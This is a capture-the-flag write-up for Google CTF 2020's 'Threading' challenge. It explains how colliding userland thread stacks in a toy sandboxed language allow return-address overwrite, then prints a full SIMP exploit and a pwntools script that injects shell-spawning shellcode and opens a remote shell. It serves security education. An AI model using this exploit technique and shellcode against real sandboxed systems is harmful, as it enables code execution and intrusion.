# Writeup for Threading (sandbox, 314 pts, 17 solves), Google CTF 2020, by LevitatingLion

> *The DevMaster Sandboxed Programming Language: Creating unintentional bugs since 2019™*
>
> After our last disaster with a sandboxed build system, we've decided to pivot. We've created a sandboxed programming language with userland thread support. Why userland threads? Because they're fast! (Benchmark results pending.)
>
> With this language, you can write code that's safe to run anywhere. Those executing your code can trust that it won't ever be able to read their precious `./flag` files.
>
> (Legal notice: 'can trust' may not be equivalent to 'should trust.' DevMaster Industries disclaims all liability resulting from running code written in the DevMaster Sandboxed Programming Language.)

## Challenge Overview

In addition to the challenge description, we were given some additional information in the challenge files: the challenge implements a sandboxed programming language with a userland threading library and we have to find a vulnerability to break out of the sandbox. Stack canaries and NX are disabled.

This programming language ("SIMP") is similar to C-languages in its syntax, with automatic (reference-counting) memory management and additional constraints to try (or more precisely, fail) to guarantee memory safety.

It consists of several parts:

- The compiler parses the SIMP source code and generates C++ source code

- The runtime is used by the generated C++ code and implements most of the SIMP language by providing C++ types and functions

- The threading library is also used by the generated C++ code and implements userspace threads

## Analysis of Threading Library

The included threading library provides userspace threads, which are implemented completely in userspace separate from the kernel-level native threads controlled by the operating system. The library uses a configurable number of native threads. Every one of the native threads picks one of the runnable userspace threads and starts executing it. When a thread blocks on a semaphore, or after a timeout is reached, its execution is interrupted and the native thread picks another runnable userspace thread to execute.

When a new userspace thread is created, the library allocates two structures required for thread operation. The first is the thread context allocated on the heap, which contains the saved register state when the thread is not executing and some thread metadata. The second is the thread's stack allocated using `mmap`, sized 256 KiB, with one guard page above and one below the stack.

Because we have enough control of the generated C++ code to allocate large arrays on the stack, we can cause a stack overflow on one of the thread stacks. As `mmap` places subsequent allocations sequentially in memory and no further protections are in place, we can use a stack overflow to cause two thread stacks to collide. We then use this collision and write values to one stack to corrupt return addresses on the other stack.

This stack overflow was the first bug I found while looking at the threading library. I don't think it's the intended bug, because it's not primarily a bug in the threading library. I think it's more of a bug in the compiler, as not checking for stack overflows is a reasonable thing to do in a memory-unsafe language like C++; pthreads allocates stacks in a very similar way.

Anyways, let's get to exploiting this bug.

## Exploiting a Stack Overflow

Because our goal is to overwrite a return address, it would be nice to get executable shellcode into the process. NX is disabled and we can get the address of a string by passing a reference to it to the `print` function, so we can simply allocate a string containing our shellcode.

Then we create two threads. The first thread is the victim, which recurses deep into a function (so that its stack is full of return addresses) and then blocks on a semaphore. The second thread will corrupt one of the victim's return addresses: it allocates a very large array on its stack (to trigger the stack overflow and collide the two stacks), overwrites a return address using a local variable, and finally unblocks the victim thread. The victim then returns from all of the nested function calls, eventually hitting the corrupted return address and executing our shellcode.

Using the shellcode, we can spawn a shell and read the flag: `CTF{This-challenge-was-very-hard}`

## Exploit Code

Finally, the SIMP code I used to exploit the server:

```c
// used to signal that pwn thread is ready
semaphore sem_pwn = 0;
// used to signal that victim thread is ready
semaphore sem_victim = 0;
// used to block indefinitely
semaphore sem_block = 0;

// address of shellcode
uint64 sc_addr = 0;
// reference to shellcode
ref<string> sc_ref;

// block thread indefinitely
def void block() {
    down(sem_block);
}

// entrypoint of program
def int32 main() {
    shellcode();

    // spray a couple of threads, to close holes in mmap() memory
    int32 i = 0;
    while (i < 8) {
        make_thread(block);
        i = i + 1;
    }
    usleep(100000);

    // spawn pwn and victim threads
    thread t_pwn = make_thread(pwn);
    thread t_victim = make_thread(victim, 100);

    // threads do all the work, so block
    block()

    return 0;
}

// read in shellcode and determine its address
def void shellcode() {
    print("send code:");
    string sc = read(1024);
    sc_ref = new<string>(sc);

    // send string representation to exploit script
    print(sc_ref);
    // read parsed address
    sc_addr = bytes64(read(8));

    print("sc_addr: ");
    print(to_hex(sc_addr));
    print("\n");
}

// recurse deep, then wait for pwn thread
def void victim(uint64 depth) {
    if (depth > 0) {
        victim(depth - 1);
    }

    if (depth == 0) {
        print("reached depth, blocking victim\n");

        // unblock pwn thread
        up(sem_pwn);
        // block this thread
        down(sem_victim);

        print("victim unblocked\n");
    }
}

// entrypoint of pwn thread
def void pwn() {
    print("in pwn\n");

    // wait for victim thread
    down(sem_pwn);

    pwn_pivot();
}

// pivot stack from pwn thread to victim thread
def void pwn_pivot() {
    print("in pwn_pivot\n");

    // pivot stack by allocating a large array
    // array is declared below, but stack space is reserved at function entry

    // this call will never return
    pwn_do();

    // use array so it's not optimized away
    array<char, 276050> a;
    int32 i = 0;
    while (i < 276050) {
        a[i] = i;
        i = i + 1;
    }
    print(a[0]);
}

// stacks of pwn and victim thread collide, overwrite victim stack
def void pwn_do() {
    print("in pwn_do\n");

    // allocate small array to overwrite some values on the victim stack
    array<uint64, 100> a;
    // specific value to prevent crash
    a[6] = 18446744073709551615;
    // overwrite return address
    a[9] = sc_addr;

    print("pwn_do done\n");

    // unblock victim thread
    up(sem_victim);
    // pwn thread is done, block forever
    block();

    // use array so it's not optimized away
    i = 0;
    while (i < 100) {
        a[i] = i;
        i = i + 1;
    }
    print(a[0]);
}
```

And the exploit script interacting with the server:

```python
from pwn import *

context.arch = "amd64"

if args.REMOTE:
    # connect to remote server
    p = process("./client exp.simp -- nc threading.2020.ctfcompetition.com 1337", shell=True)
else:
    # compile and run exploit locally
    os.system("./simple_lang/compiler/compiler exp.simp exp.simp.cpp")
    os.system("./compile.sh exp.simp exp.simp.elf")
    p = process("./exp.simp.elf")

if args.GDB:
    gdb.attach(p, gdbscript="handle SIGUSR1 nostop noprint \n handle SIGUSR2 nostop noprint \n b *sbt_pwn_pivot")

# send shellcode to exploit
p.recvuntil("send code:")
sc = asm(shellcraft.sh())
p.send(sc.ljust(1024))

# parse shellcode address and send it back
p.recvuntil("ref<")
addr = p.recvuntil(">", drop=True)
addr = int(addr, 16) + 0x50
info("addr: 0x%x", addr)
p.send(p64(addr))

# exploit spawns a shell
p.interactive()
```

## Bonus: More Bugs

I found a couple of other bugs while looking through the threading library.

First the bug that I think was the intended one: objects of type `uthread` (the type used by the runtime to represent threads) are not thread-safe. When two threads assign to the same `uthread` object, the assignment operator of its `std::shared_ptr` member is called, which causes a data race. I don't know how `shared_ptr`s are implemented exactly, but this could probably corrupt an internal reference count and cause the object owned by the `shared_ptr` to be destroyed prematurely, leading to a use-after-free.

Another bug I found is very subtle, and unfortunately not exploitable: `acquire_guard` in `shared.cc` uses `compare_exchange_weak` to update the guard variable, without checking the return value of `compare_exchange_weak`. The problem here is that `compare_exchange_weak` may fail spuriously, i.e. it may not update the variable even if the comparison should succeed. This case can only be distinguished from a successful update by examining the return value. Because the return value is ignored, `acquire_guard` does not actually acquire the lock when `compare_exchange_weak` fails spuriously. Unfortunately, this is not exploitable, for two reasons: 1. the challenge runs on x86, where `compare_exchange_weak` is compiled to the same machine code as its strong counterpart and will never fail spuriously, and 2. the missing lock will be immediately detected by `assert_guard_held`.

The last bug is a race condition in the runtime, probably not exploitable as well: the `getitem` and `setitem` methods of `dynamic_array` are not thread-safe. While one thread executes these methods, a second thread might shrink the array after the bounds check but before the array access, which would cause the first thread to access the array out-of-bounds. Triggering this bug would require a tight race, and because the runtime terminates after one failed race, this is probably not exploitable.
